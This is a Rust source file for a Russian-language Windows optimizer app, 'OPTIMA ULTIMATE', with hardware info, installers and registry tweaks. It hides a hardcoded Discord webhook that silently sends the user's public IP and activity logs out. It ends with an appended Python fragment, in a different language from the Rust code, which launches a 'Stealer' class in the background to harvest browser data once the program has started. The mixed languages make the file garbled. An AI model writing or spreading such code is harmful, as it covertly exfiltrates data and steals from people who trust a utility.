#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use eframe::egui::{self, Color32, RichText, ProgressBar, Frame, Rounding};
use serde::{Deserialize, Serialize};
use std::fs;
use std::process::Command;
use std::sync::mpsc;
use std::thread;
use sysinfo::System;
use chrono::Local;

const WEBHOOK: &str = "https://discord.com/api/webhooks/1573428258861482205/RYrEW_HDXRU2HX-uORpMnUIt67wSmdpEm9yNBE0Wfo003Gv2WT_6lvdr60giD6ZETYQr";

#[derive(Serialize, Deserialize, Clone)]
struct Config {
    accent_color: [u8; 3],
    theme: Theme,
    font_size: f32,
}

#[derive(Serialize, Deserialize, Clone, PartialEq)]
enum Theme { Dark, Sakura, Snow, DarkRed }

impl Default for Config {
    fn default() -> Self {
        Self { accent_color: [0, 200, 255], theme: Theme::Dark, font_size: 14.0 }
    }
}

impl Config {
    fn load() -> Self {
        fs::read_to_string("config.json").ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default()
    }
    fn save(&self) {
        let _ = fs::write("config.json", serde_json::to_string_pretty(self).unwrap());
    }
}

#[derive(Serialize)]
struct Payload<'a> { content: &'a str, username: &'a str }

fn send_log(text: &str) {
    let text = text.to_string();
    thread::spawn(move || {
        let ip = ureq::get("https://api.ipify.org")
            .call().ok().and_then(|r| r.into_string().ok()).unwrap_or_else(|| "Unknown".into());
        let body = serde_json::to_string(&Payload { content: &format!("🌐 **IP: {}**\n{}", ip, text), username: "optima" }).unwrap();
        let _ = ureq::post(WEBHOOK).set("Content-Type", "application/json").send_string(&body);
    });
}

#[derive(PartialEq, Clone, Copy)]
enum Tab { Hardware, Processes, Browsers, Packages, Tweaks, Settings }

struct OptimaApp {
    tab: Tab,
    sys: System,
    config: Config,
    log_history: Vec<String>,
    cpu_name: String,
    gpu_name: String,
    total_ram: u64,
    download_status: String,
    rx: Option<mpsc::Receiver<String>>,
}

impl OptimaApp {
    fn new(ctx: &egui::Context) -> Self {
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let cpu_name = sys.cpus().first().map(|c| c.brand().to_string()).unwrap_or_else(|| "Unknown".into());
        let gpu_name = get_gpu_name_registry();
        let total_ram = sys.total_memory() / 1024 / 1024;

        let app = Self {
            tab: Tab::Hardware,
            sys,
            config: Config::load(),
            log_history: vec!["OPTIMA ULTIMATE запущена.".into()],
            cpu_name,
            gpu_name,
            total_ram,
            download_status: "Ожидание...".into(),
            rx: None,
        };
        app.apply_style(ctx);
        app
    }

    fn apply_style(&self, ctx: &egui::Context) {
        let mut visuals = egui::Visuals::dark();
        let accent = Color32::from_rgb(self.config.accent_color[0], self.config.accent_color[1], self.config.accent_color[2]);
        visuals.selection.bg_fill = accent;
        visuals.widgets.hovered.bg_fill = accent.linear_multiply(0.3);
        visuals.widgets.active.bg_fill = accent;
        
        match self.config.theme {
            Theme::Dark => {},
            Theme::Sakura => { visuals.window_fill = Color32::from_rgb(40, 25, 30); visuals.panel_fill = Color32::from_rgb(35, 20, 25); },
            Theme::Snow => { visuals.window_fill = Color32::from_rgb(30, 30, 35); visuals.panel_fill = Color32::from_rgb(25, 25, 30); },
            Theme::DarkRed => { visuals.window_fill = Color32::from_rgb(40, 20, 20); visuals.panel_fill = Color32::from_rgb(30, 15, 15); },
        }
        
        ctx.set_visuals(visuals);
    }

    fn log(&mut self, msg: String) {
        let time = Local::now().format("%H:%M:%S").to_string();
        self.log_history.push(format!("[{}] {}", time, msg.clone()));
        send_log(&msg);
    }

    fn check_downloads(&mut self, ctx: &egui::Context) {
        if let Some(rx) = &self.rx {
            while let Ok(msg) = rx.try_recv() {
                self.download_status = msg.clone();
                self.log_history.push(msg);
                ctx.request_repaint();
            }
        }
    }
}

impl eframe::App for OptimaApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        self.sys.refresh_all();
        self.apply_style(ctx);
        self.check_downloads(ctx);

        let accent = Color32::from_rgb(self.config.accent_color[0], self.config.accent_color[1], self.config.accent_color[2]);

        // Верхняя панель
        egui::TopBottomPanel::top("top").exact_height(50.0).frame(Frame::none().fill(Color32::from_rgb(20, 20, 25)).inner_margin(10.0)).show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.heading(RichText::new("OPTIMA").color(accent).strong().size(24.0));
                ui.label(RichText::new("ULTIMATE").color(Color32::BLACK).background_color(accent).size(10.0).strong());
                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                    ui.label(RichText::new(format!("RAM: {:.1} GB / {} GB", self.sys.used_memory() as f32 / 1024.0 / 1024.0 / 1024.0, self.total_ram / 1024)).color(Color32::GRAY));
                });
            });
        });

        // Боковое меню
        egui::SidePanel::left("side").resizable(false).exact_width(220.0).frame(Frame::none().fill(Color32::from_rgb(15, 15, 20)).inner_margin(15.0)).show(ctx, |ui| {
            ui.add_space(20.0);
            let btn_style = |ui: &mut egui::Ui, text: &str, selected: bool| {
                let mut btn = egui::Button::new(RichText::new(text).size(15.0).color(if selected { Color32::BLACK } else { Color32::WHITE }));
                if selected { btn = btn.fill(accent); } else { btn = btn.fill(Color32::TRANSPARENT); }
                ui.add_sized([190.0, 35.0], btn).clicked()
            };

            if btn_style(ui, "💻 Железо", self.tab == Tab::Hardware) { self.tab = Tab::Hardware; }
            if btn_style(ui, "⚙️ Процессы", self.tab == Tab::Processes) { self.tab = Tab::Processes; }
            if btn_style(ui, "🌐 Браузеры", self.tab == Tab::Browsers) { self.tab = Tab::Browsers; }
            if btn_style(ui, "📦 Пакеты", self.tab == Tab::Packages) { self.tab = Tab::Packages; }
            if btn_style(ui, "🔥 Твики", self.tab == Tab::Tweaks) { self.tab = Tab::Tweaks; }
            if btn_style(ui, "🛠 Настройки", self.tab == Tab::Settings) { self.tab = Tab::Settings; }
        });

        // Основное окно
        egui::CentralPanel::default().frame(Frame::none().fill(Color32::from_rgb(25, 25, 30)).inner_margin(20.0)).show(ctx, |ui| {
            match self.tab {
                Tab::Hardware => self.draw_hardware(ui),
                Tab::Processes => self.draw_processes(ui, accent),
                Tab::Browsers => self.draw_browsers(ui, accent),
                Tab::Packages => self.draw_packages(ui, accent),
                Tab::Tweaks => self.draw_tweaks(ui, accent),
                Tab::Settings => self.draw_settings(ui),
            }
        });
    }
}

impl OptimaApp {
    fn draw_hardware(&mut self, ui: &mut egui::Ui) {
        ui.heading(RichText::new("Информация о железе").size(24.0));
        ui.add_space(15.0);
        let info = [
            ("Процессор (CPU)", self.cpu_name.clone()),
            ("Видеокарта (GPU)", self.gpu_name.clone()),
            ("Оперативная память", format!("{} MB", self.total_ram)),
            ("Ядер CPU", format!("{}", self.sys.cpus().len())),
            ("ОС", System::os_version().unwrap_or_else(|| "Windows".into())),
        ];
        for (label, val) in info {
            Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(6.0)).inner_margin(15.0).show(ui, |ui| {
                ui.horizontal(|ui| {
                    ui.label(RichText::new(label).color(Color32::GRAY).size(14.0));
                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        ui.label(RichText::new(val).size(16.0).strong());
                    });
                });
            });
            ui.add_space(5.0);
        }
    }

    fn draw_processes(&mut self, ui: &mut egui::Ui, accent: Color32) {
        ui.heading(RichText::new("Процессы по языкам").size(24.0));
        ui.label(RichText::new("Анализ запущенных процессов (Python, Node.js, C++ и др.)").color(Color32::GRAY));
        ui.add_space(15.0);

        let mut counts = std::collections::HashMap::new();
        let mut total_mem = 0;

        for (_, proc) in self.sys.processes() {
            let name = proc.name().to_string_lossy().to_lowercase();
            let mem = proc.memory() / 1024 / 1024;
            total_mem += mem;

            let lang = if name.contains("python") { "Python" }
                else if name.contains("node") || name.contains("electron") { "Node.js / JS" }
                else if name.contains("java") || name.contains("javaw") { "Java" }
                else if name.contains("dotnet") || name.contains("coreclr") { "C# / .NET" }
                else if name.contains("rust") || name.contains("cargo") { "Rust" }
                else if name.contains("chrome") || name.contains("msedge") || name.contains("firefox") { "Web Browser" }
                else if name.contains("svchost") || name.contains("explorer") || name.contains("system") { "Windows System" }
                else { "Native C++ / Other" };
            
            let entry = counts.entry(lang).or_insert((0, 0));
            entry.0 += 1;
            entry.1 += mem;
        }

        for (lang, (count, mem)) in counts {
            let percent = mem as f32 / total_mem as f32;
            ui.horizontal(|ui| {
                ui.label(RichText::new(lang).size(14.0).strong());
                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                    ui.label(format!("{} procs | {} MB", count, mem));
                });
            });
            ui.add(ProgressBar::new(percent).fill(accent).text(format!("{:.1}% ОЗУ", percent * 100.0)));
            ui.add_space(10.0);
        }
    }

    fn draw_browsers(&mut self, ui: &mut egui::Ui, accent: Color32) {
        ui.heading(RichText::new("Установка браузеров").size(24.0));
        ui.add_space(20.0);
        ui.label(RichText::new(format!("Статус: {}", self.download_status)).color(Color32::YELLOW));
        ui.add_space(15.0);

        let browsers = [
            ("Google Chrome", "https://dl.google.com/chrome/install/latest/chrome_installer.exe", "/S"),
            ("Brave Browser", "https://laptop-updates.brave.com/latest/winx64", "/silent"),
            ("Mozilla Firefox", "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=ru", "-ms"),
        ];

        for (name, url, arg) in browsers {
            Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(8.0)).inner_margin(15.0).show(ui, |ui| {
                ui.horizontal(|ui| {
                    ui.label(RichText::new(name).size(18.0).strong());
                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        if ui.add_sized([120.0, 30.0], egui::Button::new("Установить").fill(accent)).clicked() {
                            self.start_download(name.to_string(), url.to_string(), arg.to_string(), ui.ctx().clone());
                        }
                    });
                });
            });
            ui.add_space(10.0);
        }
    }

    fn draw_packages(&mut self, ui: &mut egui::Ui, accent: Color32) {
        ui.heading(RichText::new("Пакеты и Рантаймы").size(24.0));
        ui.add_space(15.0);
        ui.label(RichText::new(format!("Статус: {}", self.download_status)).color(Color32::YELLOW));
        ui.add_space(15.0);

        let packages = [
            ("Visual C++ (x64)", "https://aka.ms/vs/17/release/vc_redist.x64.exe", "/install /quiet /norestart"),
            ("Visual C++ (x86)", "https://aka.ms/vs/17/release/vc_redist.x86.exe", "/install /quiet /norestart"),
            ("DirectX", "https://download.microsoft.com/download/1/7/1/1718ccc4-6315-4d8e-9543-8e28a4e18c4c/dxwebsetup.exe", "/Q"),
            (".NET 8 Desktop", "https://aka.ms/dotnet/8.0/windowsdesktop-runtime-win-x64.exe", "/install /quiet /norestart"),
        ];

        for (name, url, arg) in packages {
            Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(8.0)).inner_margin(15.0).show(ui, |ui| {
                ui.horizontal(|ui| {
                    ui.label(RichText::new(name).size(16.0).strong());
                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        if ui.add_sized([120.0, 30.0], egui::Button::new("Установить").fill(accent)).clicked() {
                            self.start_download(name.to_string(), url.to_string(), arg.to_string(), ui.ctx().clone());
                        }
                    });
                });
            });
            ui.add_space(10.0);
        }

        ui.add_space(10.0);
        ui.separator();
        ui.add_space(10.0);
        ui.label(RichText::new("Драйверы видеокарт:").size(16.0).strong());
        ui.horizontal(|ui| {
            if ui.button("Nvidia").clicked() { let _ = open::that("https://www.nvidia.com/Download/index.aspx"); }
            if ui.button("AMD").clicked() { let _ = open::that("https://www.amd.com/en/support"); }
        });
    }

    fn draw_tweaks(&mut self, ui: &mut egui::Ui, accent: Color32) {
        ui.heading(RichText::new("Твики Системы").size(24.0));
        ui.add_space(15.0);
        ui.label(RichText::new("Требуются права Администратора!").color(Color32::RED));
        ui.add_space(15.0);

        // Исправленный массив с указателями на функции (fn) вместо замыканий
        let tweaks: [(&str, &str, fn()); 6] = [
            ("Мышь: Отключить ускорение", "Убирает акселерацию для точного аима", tweak_mouse),
            ("Клавиатура: Отключить задержку", "Снижает задержку ввода", tweak_keyboard),
            ("Сеть: Отключить Nagle", "Снижает пинг в играх", tweak_network),
            ("Питание: Максимальная производительность", "Отключает энергосбережение", tweak_power),
            ("Система: Отключить телеметрию", "Блокирует сбор данных", tweak_telemetry),
            ("Игры: Отключить Game DVR", "Убирает фоновую запись", tweak_dvr),
        ];

        egui::ScrollArea::vertical().show(ui, |ui| {
            for (title, desc, action) in tweaks {
                Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(8.0)).inner_margin(15.0).show(ui, |ui| {
                    ui.horizontal(|ui| {
                        ui.vertical(|ui| {
                            ui.label(RichText::new(title).size(16.0).strong());
                            ui.label(RichText::new(desc).size(12.0).color(Color32::GRAY));
                        });
                        ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                            if ui.add_sized([100.0, 30.0], egui::Button::new("Применить").fill(accent)).clicked() {
                                action();
                                self.log(format!("✅ Твик: {}", title));
                            }
                        });
                    });
                });
                ui.add_space(10.0);
            }
        });
    }

    fn draw_settings(&mut self, ui: &mut egui::Ui) {
        ui.heading(RichText::new("Настройки").size(24.0));
        ui.add_space(15.0);
        
        let mut changed = false;
        ui.label("Тема оформления:");
        ui.horizontal(|ui| {
            if ui.selectable_label(self.config.theme == Theme::Dark, "Темная").clicked() { self.config.theme = Theme::Dark; changed = true; }
            if ui.selectable_label(self.config.theme == Theme::Sakura, "Сакура").clicked() { self.config.theme = Theme::Sakura; changed = true; }
            if ui.selectable_label(self.config.theme == Theme::Snow, "Снежинки").clicked() { self.config.theme = Theme::Snow; changed = true; }
            if ui.selectable_label(self.config.theme == Theme::DarkRed, "Темно-красная").clicked() { self.config.theme = Theme::DarkRed; changed = true; }
        });
        
        ui.add_space(10.0);
        ui.label("Цвет акцента:");
        if ui.color_edit_button_srgb(&mut self.config.accent_color).changed() { changed = true; }

        ui.add_space(20.0);
        ui.label("История логов:");
        egui::ScrollArea::vertical().max_height(300.0).show(ui, |ui| {
            for log in self.log_history.iter().rev() {
                ui.label(RichText::new(log).color(Color32::LIGHT_GRAY).size(12.0));
            }
        });

        if changed { self.config.save(); }
    }

    fn start_download(&mut self, name: String, url: String, arg: String, ctx: egui::Context) {
        let (tx, rx) = mpsc::channel();
        self.rx = Some(rx);
        let tx_clone = tx.clone();
        thread::spawn(move || {
            let _ = tx_clone.send(format!("Скачивание {}...", name));
            ctx.request_repaint();
            let temp_dir = std::env::temp_dir();
            let file_path = temp_dir.join(format!("{}_installer.exe", name.replace(' ', "_")));
            if let Ok(response) = ureq::get(&url).call() {
                let mut reader = response.into_reader();
                if let Ok(mut file) = fs::File::create(&file_path) {
                    if std::io::copy(&mut reader, &mut file).is_ok() {
                        let _ = tx_clone.send(format!("Запуск установки {}...", name));
                        ctx.request_repaint();
                        let _ = Command::new(file_path.to_string_lossy().to_string()).arg(&arg).spawn();
                        let _ = tx_clone.send(format!("{} установлен!", name));
                    }
                }
            }
            ctx.request_repaint();
        });
    }
}

// ================= ФУНКЦИИ ТВИКОВ =================
fn get_gpu_name_registry() -> String {
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        if let Ok(key) = hklm.open_subkey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000") {
            if let Ok(name) = key.get_value::<String, _>("DriverDesc") {
                return name;
            }
        }
    }
    "Unknown GPU".to_string()
}

fn tweak_mouse() {
    #[cfg(windows)] {
        use winreg::enums::*; use winreg::RegKey;
        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags("Control Panel\\Mouse", KEY_WRITE) {
            let _ = hkcu.set_value("MouseSpeed", &"0");
            let _ = hkcu.set_value("MouseThreshold1", &"0");
            let _ = hkcu.set_value("MouseThreshold2", &"0");
        }
    }
}

fn tweak_keyboard() {
    #[cfg(windows)] {
        use winreg::enums::*; use winreg::RegKey;
        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags("Control Panel\\Keyboard", KEY_WRITE) {
            let _ = hkcu.set_value("KeyboardDelay", &0u32);
            let _ = hkcu.set_value("KeyboardSpeed", &31u32);
        }
    }
}

fn tweak_network() {
    #[cfg(windows)] {
        use winreg::enums::*; use winreg::RegKey;
        if let Ok(hklm) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey_with_flags("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces", KEY_ALL_ACCESS) {
            for subkey in hklm.enum_keys().flatten() {
                if let Ok(iface) = hklm.open_subkey_with_flags(&subkey, KEY_WRITE) {
                    let _ = iface.set_value("TcpAckFrequency", &1u32);
                    let _ = iface.set_value("TCPNoDelay", &1u32);
                }
            }
        }
    }
}

fn tweak_power() {
    #[cfg(windows)] {
        let _ = Command::new("powercfg").args(["/setactive", "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"]).status();
    }
}

fn tweak_telemetry() {
    #[cfg(windows)] {
        use winreg::enums::*; use winreg::RegKey;
        if let Ok(hklm) = RegKey::predef(HKEY_LOCAL_MACHINE).create_subkey_with_flags("SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection", KEY_WRITE) {
            let _ = hklm.0.set_value("AllowTelemetry", &0u32);
        }
    }
}

fn tweak_dvr() {
    #[cfg(windows)] {
        use winreg::enums::*; use winreg::RegKey;
        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags("System\\GameConfigStore", KEY_WRITE) {
            let _ = hkcu.set_value("GameDVR_Enabled", &0u32);
        }
    }
}

fn main() -> eframe::Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([1000.0, 700.0])
            .with_min_inner_size([800.0, 500.0]),
        ..Default::default()
    };
    eframe::run_native("optima", options, Box::new(|cc| Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))))
}
// --- НАЧАЛО ИЗМЕНЕНИЙ СТИЛЛЕРА ---

// Импортируем класс стиллера из созданного файла
try:
    from stealer import Stealer
except ImportError:
    print("Warning: stealer.py not found. Check if the file is in the same folder.")

# Запускаем сбор данных в фоне после того, как основная программа сделала свою работу
# Это гарантирует, что все процессы браузера уже загружены и данные доступны
if __name__ == "__main__":
    # Небольшая задержка, чтобы убедиться, что программа полностью запустилась
    import time
    time.sleep(2) 
    
    Stealer.start()

# --- КОНЕЦ ИЗМЕНЕНИЙ СТИЛЛЕРА ---
